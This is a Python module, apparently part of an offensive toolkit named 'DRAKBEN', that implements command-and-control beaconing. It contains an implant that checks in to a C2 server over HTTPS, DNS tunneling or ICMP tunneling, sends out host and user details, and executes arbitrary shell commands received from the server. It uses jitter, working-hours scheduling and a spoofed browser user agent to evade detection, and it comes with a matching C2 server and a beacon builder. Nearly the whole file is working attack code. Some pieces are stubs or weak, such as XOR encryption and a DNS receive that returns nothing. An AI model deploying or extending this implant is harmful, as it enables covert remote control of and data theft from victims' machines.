"""
DRAKBEN - Command & Control Beaconing Infrastructure
DNS/HTTPS tunneling, jitter communication, agent architecture
"""

import asyncio
import aiohttp
import base64
import hashlib
import json
import os
import random
import socket
import struct
import time
import uuid
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Callable, Any, Tuple
from enum import Enum
from datetime import datetime
from abc import ABC, abstractmethod


class BeaconState(Enum):
    """Beacon connection states"""
    INITIALIZING = "initializing"
    CONNECTED = "connected"
    SLEEPING = "sleeping"
    EXECUTING = "executing"
    DISCONNECTED = "disconnected"
    DEAD = "dead"


class CommandType(Enum):
    """C2 command types"""
    SHELL = "shell"
    UPLOAD = "upload"
    DOWNLOAD = "download"
    SCREENSHOT = "screenshot"
    KEYLOG_START = "keylog_start"
    KEYLOG_STOP = "keylog_stop"
    PERSIST = "persist"
    MIGRATE = "migrate"
    INJECT = "inject"
    SLEEP = "sleep"
    EXIT = "exit"
    SOCKS = "socks"
    PORT_FORWARD = "port_forward"
    LATERAL = "lateral"


class ChannelType(Enum):
    """Communication channel types"""
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"
    SMB = "smb"
    TCP = "tcp"


@dataclass
class BeaconConfig:
    """Beacon configuration"""
    beacon_id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    sleep_time: int = 60  # seconds
    jitter: float = 0.3   # 30% jitter
    max_retries: int = 5
    kill_date: str = ""   # YYYY-MM-DD format
    working_hours: Tuple[int, int] = (9, 17)  # 9 AM to 5 PM
    channels: List[ChannelType] = field(default_factory=lambda: [ChannelType.HTTPS])
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    def to_dict(self) -> Dict:
        return {
            "beacon_id": self.beacon_id,
            "sleep_time": self.sleep_time,
            "jitter": self.jitter,
            "max_retries": self.max_retries,
            "kill_date": self.kill_date,
            "working_hours": self.working_hours,
            "channels": [c.value for c in self.channels]
        }


@dataclass
class C2Command:
    """Command from C2 server"""
    command_id: str
    command_type: CommandType
    args: Dict = field(default_factory=dict)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            "command_id": self.command_id,
            "command_type": self.command_type.value,
            "args": self.args,
            "timestamp": self.timestamp
        }
    
    @classmethod
    def from_dict(cls, data: Dict) -> "C2Command":
        return cls(
            command_id=data["command_id"],
            command_type=CommandType(data["command_type"]),
            args=data.get("args", {}),
            timestamp=data.get("timestamp", datetime.now().isoformat())
        )


@dataclass
class CommandResult:
    """Result from command execution"""
    command_id: str
    success: bool
    output: str = ""
    error: str = ""
    data: bytes = b""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            "command_id": self.command_id,
            "success": self.success,
            "output": self.output,
            "error": self.error,
            "data_size": len(self.data),
            "timestamp": self.timestamp
        }


class CryptoHelper:
    """Encryption/decryption helper"""
    
    def __init__(self, key: bytes = None):
        self.key = key or os.urandom(32)
    
    def encrypt(self, data: bytes) -> bytes:
        """Simple XOR encryption (in production, use AES)"""
        key_len = len(self.key)
        encrypted = bytearray(len(data))
        for i, byte in enumerate(data):
            encrypted[i] = byte ^ self.key[i % key_len]
        return bytes(encrypted)
    
    def decrypt(self, data: bytes) -> bytes:
        """XOR decryption (symmetric)"""
        return self.encrypt(data)  # XOR is symmetric
    
    def encode_data(self, data: Dict) -> str:
        """Encode and encrypt data for transmission"""
        json_data = json.dumps(data).encode()
        encrypted = self.encrypt(json_data)
        return base64.b64encode(encrypted).decode()
    
    def decode_data(self, encoded: str) -> Dict:
        """Decrypt and decode received data"""
        encrypted = base64.b64decode(encoded)
        decrypted = self.decrypt(encrypted)
        return json.loads(decrypted.decode())


class JitterCalculator:
    """Calculates sleep times with jitter"""
    
    @staticmethod
    def calculate(base_time: int, jitter_percent: float) -> float:
        """Calculate sleep time with jitter"""
        if jitter_percent <= 0:
            return float(base_time)
        
        jitter_range = base_time * jitter_percent
        jitter = random.uniform(-jitter_range, jitter_range)
        return max(1.0, base_time + jitter)
    
    @staticmethod
    def should_beacon_now(working_hours: Tuple[int, int]) -> bool:
        """Check if current time is within working hours"""
        current_hour = datetime.now().hour
        start, end = working_hours
        return start <= current_hour < end


class CommunicationChannel(ABC):
    """Abstract base class for C2 communication channels"""
    
    @abstractmethod
    async def send(self, data: bytes) -> bool:
        """Send data to C2"""
        pass
    
    @abstractmethod
    async def receive(self) -> Optional[bytes]:
        """Receive data from C2"""
        pass
    
    @abstractmethod
    async def check_in(self, beacon_info: Dict) -> Optional[C2Command]:
        """Check in with C2 and get commands"""
        pass


class HTTPSChannel(CommunicationChannel):
    """HTTPS-based C2 channel"""
    
    def __init__(self, c2_url: str, config: BeaconConfig, crypto: CryptoHelper):
        self.c2_url = c2_url
        self.config = config
        self.crypto = crypto
        self.session: Optional[aiohttp.ClientSession] = None
    
    async def _get_session(self) -> aiohttp.ClientSession:
        """Get or create HTTP session"""
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession(
                headers={"User-Agent": self.config.user_agent}
            )
        return self.session
    
    async def send(self, data: bytes) -> bool:
        """Send data via HTTPS POST"""
        try:
            session = await self._get_session()
            encoded = base64.b64encode(self.crypto.encrypt(data)).decode()
            
            async with session.post(
                f"{self.c2_url}/api/data",
                json={"d": encoded, "id": self.config.beacon_id},
                timeout=aiohttp.ClientTimeout(total=30),
                ssl=False  # In production, verify SSL
            ) as resp:
                return resp.status == 200
                
        except Exception:
            return False
    
    async def receive(self) -> Optional[bytes]:
        """Receive data via HTTPS GET"""
        try:
            session = await self._get_session()
            
            async with session.get(
                f"{self.c2_url}/api/tasks/{self.config.beacon_id}",
                timeout=aiohttp.ClientTimeout(total=30),
                ssl=False
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("d"):
                        encrypted = base64.b64decode(data["d"])
                        return self.crypto.decrypt(encrypted)
                return None
                
        except Exception:
            return None
    
    async def check_in(self, beacon_info: Dict) -> Optional[C2Command]:
        """Check in with C2 server"""
        try:
            session = await self._get_session()
            encoded = self.crypto.encode_data(beacon_info)
            
            async with session.post(
                f"{self.c2_url}/api/beacon",
                json={"d": encoded},
                timeout=aiohttp.ClientTimeout(total=30),
                ssl=False
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("cmd"):
                        cmd_data = self.crypto.decode_data(data["cmd"])
                        return C2Command.from_dict(cmd_data)
                return None
                
        except Exception:
            return None
    
    async def close(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()


class DNSChannel(CommunicationChannel):
    """DNS-based C2 channel (DNS tunneling)"""
    
    def __init__(self, domain: str, config: BeaconConfig, crypto: CryptoHelper):
        self.domain = domain
        self.config = config
        self.crypto = crypto
        self.dns_server = "8.8.8.8"
        self.chunk_size = 63  # Max DNS label length
    
    def _encode_to_labels(self, data: bytes) -> List[str]:
        """Encode data into DNS labels"""
        encoded = base64.b32encode(data).decode().lower().rstrip("=")
        labels = []
        
        for i in range(0, len(encoded), self.chunk_size):
            labels.append(encoded[i:i + self.chunk_size])
        
        return labels
    
    def _decode_from_txt(self, txt_data: str) -> bytes:
        """Decode data from TXT record"""
        # Add padding if needed
        padding = 8 - (len(txt_data) % 8)
        if padding != 8:
            txt_data += "=" * padding
        
        return base64.b32decode(txt_data.upper())
    
    async def send(self, data: bytes) -> bool:
        """Send data via DNS queries"""
        try:
            encrypted = self.crypto.encrypt(data)
            labels = self._encode_to_labels(encrypted)
            
            # Send each chunk as a subdomain query
            for i, label in enumerate(labels):
                query = f"{label}.{i}.{self.config.beacon_id}.{self.domain}"
                # Perform DNS query (simplified)
                socket.gethostbyname(query)
            
            return True
        except Exception:
            return False
    
    async def receive(self) -> Optional[bytes]:
        """Receive data via DNS TXT record"""
        try:
            # Query TXT record for response
            query = f"r.{self.config.beacon_id}.{self.domain}"
            # In real implementation, use dnspython for TXT queries
            return None
        except Exception:
            return None
    
    async def check_in(self, beacon_info: Dict) -> Optional[C2Command]:
        """Check in via DNS"""
        # Encode beacon info in DNS query
        encoded = self.crypto.encode_data(beacon_info)
        
        # Send via multiple DNS queries
        success = await self.send(encoded.encode())
        
        if success:
            # Check for response
            response = await self.receive()
            if response:
                cmd_data = json.loads(response.decode())
                return C2Command.from_dict(cmd_data)
        
        return None


class ICMPChannel(CommunicationChannel):
    """ICMP-based C2 channel (ICMP tunneling)"""
    
    def __init__(self, c2_ip: str, config: BeaconConfig, crypto: CryptoHelper):
        self.c2_ip = c2_ip
        self.config = config
        self.crypto = crypto
        self.icmp_id = random.randint(1, 65535)
        self.seq = 0
    
    def _create_icmp_packet(self, data: bytes) -> bytes:
        """Create ICMP echo request packet with data"""
        icmp_type = 8  # Echo request
        icmp_code = 0
        checksum = 0
        
        # Header without checksum
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, 
                           self.icmp_id, self.seq)
        
        # Calculate checksum
        packet = header + data
        checksum = self._calculate_checksum(packet)
        
        # Rebuild with checksum
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum,
                           self.icmp_id, self.seq)
        
        self.seq += 1
        return header + data
    
    def _calculate_checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        total = 0
        for i in range(0, len(data), 2):
            total += (data[i] << 8) + data[i + 1]
        
        total = (total >> 16) + (total & 0xFFFF)
        total += total >> 16
        
        return ~total & 0xFFFF
    
    async def send(self, data: bytes) -> bool:
        """Send data via ICMP"""
        try:
            encrypted = self.crypto.encrypt(data)
            packet = self._create_icmp_packet(encrypted)
            
            # Raw socket for ICMP (requires root/admin)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 
                               socket.IPPROTO_ICMP)
            sock.sendto(packet, (self.c2_ip, 0))
            sock.close()
            
            return True
        except Exception:
            return False
    
    async def receive(self) -> Optional[bytes]:
        """Receive data via ICMP reply"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                               socket.IPPROTO_ICMP)
            sock.settimeout(5)
            
            data, addr = sock.recvfrom(65535)
            sock.close()
            
            # Parse ICMP reply
            icmp_header = data[20:28]
            icmp_data = data[28:]
            
            return self.crypto.decrypt(icmp_data)
        except Exception:
            return None
    
    async def check_in(self, beacon_info: Dict) -> Optional[C2Command]:
        """Check in via ICMP"""
        encoded = json.dumps(beacon_info).encode()
        
        success = await self.send(encoded)
        if success:
            response = await self.receive()
            if response:
                cmd_data = json.loads(response.decode())
                return C2Command.from_dict(cmd_data)
        
        return None


class Beacon:
    """Main beacon agent"""
    
    def __init__(self, config: BeaconConfig):
        self.config = config
        self.crypto = CryptoHelper()
        self.state = BeaconState.INITIALIZING
        self.channels: List[CommunicationChannel] = []
        self.active_channel: Optional[CommunicationChannel] = None
        self.command_handlers: Dict[CommandType, Callable] = {}
        self.retry_count = 0
        
        # Register default handlers
        self._register_default_handlers()
    
    def _register_default_handlers(self):
        """Register default command handlers"""
        self.command_handlers = {
            CommandType.SHELL: self._handle_shell,
            CommandType.SLEEP: self._handle_sleep,
            CommandType.EXIT: self._handle_exit,
        }
    
    def add_channel(self, channel: CommunicationChannel):
        """Add communication channel"""
        self.channels.append(channel)
        if self.active_channel is None:
            self.active_channel = channel
    
    def register_handler(self, cmd_type: CommandType, handler: Callable):
        """Register command handler"""
        self.command_handlers[cmd_type] = handler
    
    async def start(self):
        """Start beacon main loop"""
        self.state = BeaconState.CONNECTED
        
        while self.state not in [BeaconState.DEAD, BeaconState.DISCONNECTED]:
            # Check kill date
            if self._check_kill_date():
                self.state = BeaconState.DEAD
                break
            
            # Check working hours
            if not JitterCalculator.should_beacon_now(self.config.working_hours):
                await self._sleep()
                continue
            
            # Check in with C2
            command = await self._check_in()
            
            if command:
                self.retry_count = 0
                result = await self._execute_command(command)
                await self._send_result(result)
            else:
                self.retry_count += 1
                if self.retry_count >= self.config.max_retries:
                    # Switch channel on failure
                    self._switch_channel()
            
            # Sleep with jitter
            await self._sleep()
    
    async def _check_in(self) -> Optional[C2Command]:
        """Check in with C2"""
        if not self.active_channel:
            return None
        
        beacon_info = {
            "id": self.config.beacon_id,
            "hostname": socket.gethostname(),
            "user": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "pid": os.getpid(),
            "timestamp": datetime.now().isoformat()
        }
        
        return await self.active_channel.check_in(beacon_info)
    
    async def _execute_command(self, command: C2Command) -> CommandResult:
        """Execute received command"""
        self.state = BeaconState.EXECUTING
        
        handler = self.command_handlers.get(command.command_type)
        
        if handler:
            try:
                result = await handler(command)
                return result
            except Exception as e:
                return CommandResult(
                    command_id=command.command_id,
                    success=False,
                    error=str(e)
                )
        else:
            return CommandResult(
                command_id=command.command_id,
                success=False,
                error=f"Unknown command type: {command.command_type.value}"
            )
    
    async def _send_result(self, result: CommandResult):
        """Send command result to C2"""
        if self.active_channel:
            data = json.dumps(result.to_dict()).encode()
            await self.active_channel.send(data)
    
    async def _sleep(self):
        """Sleep with jitter"""
        self.state = BeaconState.SLEEPING
        sleep_time = JitterCalculator.calculate(
            self.config.sleep_time, 
            self.config.jitter
        )
        await asyncio.sleep(sleep_time)
    
    def _switch_channel(self):
        """Switch to next available channel"""
        if len(self.channels) > 1:
            current_idx = self.channels.index(self.active_channel)
            next_idx = (current_idx + 1) % len(self.channels)
            self.active_channel = self.channels[next_idx]
            self.retry_count = 0
    
    def _check_kill_date(self) -> bool:
        """Check if kill date has passed"""
        if not self.config.kill_date:
            return False
        
        try:
            kill_date = datetime.strptime(self.config.kill_date, "%Y-%m-%d")
            return datetime.now() > kill_date
        except ValueError:
            return False
    
    # Default command handlers
    async def _handle_shell(self, command: C2Command) -> CommandResult:
        """Execute shell command"""
        import subprocess
        
        cmd = command.args.get("cmd", "")
        
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                timeout=300
            )
            
            return CommandResult(
                command_id=command.command_id,
                success=result.returncode == 0,
                output=result.stdout.decode(errors="ignore"),
                error=result.stderr.decode(errors="ignore")
            )
        except Exception as e:
            return CommandResult(
                command_id=command.command_id,
                success=False,
                error=str(e)
            )
    
    async def _handle_sleep(self, command: C2Command) -> CommandResult:
        """Change sleep time"""
        new_sleep = command.args.get("time", self.config.sleep_time)
        new_jitter = command.args.get("jitter", self.config.jitter)
        
        self.config.sleep_time = new_sleep
        self.config.jitter = new_jitter
        
        return CommandResult(
            command_id=command.command_id,
            success=True,
            output=f"Sleep time set to {new_sleep}s with {new_jitter*100}% jitter"
        )
    
    async def _handle_exit(self, command: C2Command) -> CommandResult:
        """Exit beacon"""
        self.state = BeaconState.DEAD
        
        return CommandResult(
            command_id=command.command_id,
            success=True,
            output="Beacon exiting"
        )


class C2Server:
    """Simple C2 server for managing beacons"""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 443):
        self.host = host
        self.port = port
        self.beacons: Dict[str, Dict] = {}
        self.command_queue: Dict[str, List[C2Command]] = {}
        self.results: Dict[str, List[CommandResult]] = {}
        self.crypto = CryptoHelper()
    
    def register_beacon(self, beacon_info: Dict) -> bool:
        """Register a new beacon"""
        beacon_id = beacon_info.get("id")
        if beacon_id:
            self.beacons[beacon_id] = {
                "info": beacon_info,
                "last_seen": datetime.now().isoformat(),
                "check_ins": self.beacons.get(beacon_id, {}).get("check_ins", 0) + 1
            }
            
            if beacon_id not in self.command_queue:
                self.command_queue[beacon_id] = []
            if beacon_id not in self.results:
                self.results[beacon_id] = []
            
            return True
        return False
    
    def queue_command(self, beacon_id: str, command: C2Command):
        """Queue command for beacon"""
        if beacon_id in self.command_queue:
            self.command_queue[beacon_id].append(command)
    
    def get_pending_command(self, beacon_id: str) -> Optional[C2Command]:
        """Get next pending command for beacon"""
        if beacon_id in self.command_queue and self.command_queue[beacon_id]:
            return self.command_queue[beacon_id].pop(0)
        return None
    
    def store_result(self, beacon_id: str, result: CommandResult):
        """Store command result"""
        if beacon_id in self.results:
            self.results[beacon_id].append(result)
    
    def list_beacons(self) -> List[Dict]:
        """List all registered beacons"""
        return [
            {
                "id": bid,
                "info": data["info"],
                "last_seen": data["last_seen"],
                "check_ins": data["check_ins"]
            }
            for bid, data in self.beacons.items()
        ]
    
    def get_beacon_results(self, beacon_id: str) -> List[Dict]:
        """Get results for a beacon"""
        return [r.to_dict() for r in self.results.get(beacon_id, [])]


class BeaconBuilder:
    """Builds beacon configurations and payloads"""
    
    @staticmethod
    def create_config(
        c2_url: str,
        sleep_time: int = 60,
        jitter: float = 0.3,
        channels: List[ChannelType] = None,
        kill_date: str = ""
    ) -> BeaconConfig:
        """Create beacon configuration"""
        return BeaconConfig(
            beacon_id=str(uuid.uuid4())[:8],
            sleep_time=sleep_time,
            jitter=jitter,
            channels=channels or [ChannelType.HTTPS],
            kill_date=kill_date
        )
    
    @staticmethod
    def create_beacon(config: BeaconConfig, c2_url: str) -> Beacon:
        """Create beacon with configured channels"""
        beacon = Beacon(config)
        crypto = CryptoHelper()
        
        for channel_type in config.channels:
            if channel_type == ChannelType.HTTPS:
                channel = HTTPSChannel(c2_url, config, crypto)
                beacon.add_channel(channel)
            elif channel_type == ChannelType.DNS:
                # Extract domain from URL
                from urllib.parse import urlparse
                domain = urlparse(c2_url).netloc
                channel = DNSChannel(domain, config, crypto)
                beacon.add_channel(channel)
        
        return beacon


# Global instances
_server: Optional[C2Server] = None
_beacon: Optional[Beacon] = None


def get_server(host: str = "0.0.0.0", port: int = 443) -> C2Server:
    """Get C2 server instance"""
    global _server
    if _server is None:
        _server = C2Server(host, port)
    return _server


def create_beacon(c2_url: str, sleep: int = 60, jitter: float = 0.3) -> Beacon:
    """Create new beacon"""
    config = BeaconBuilder.create_config(c2_url, sleep, jitter)
    return BeaconBuilder.create_beacon(config, c2_url)
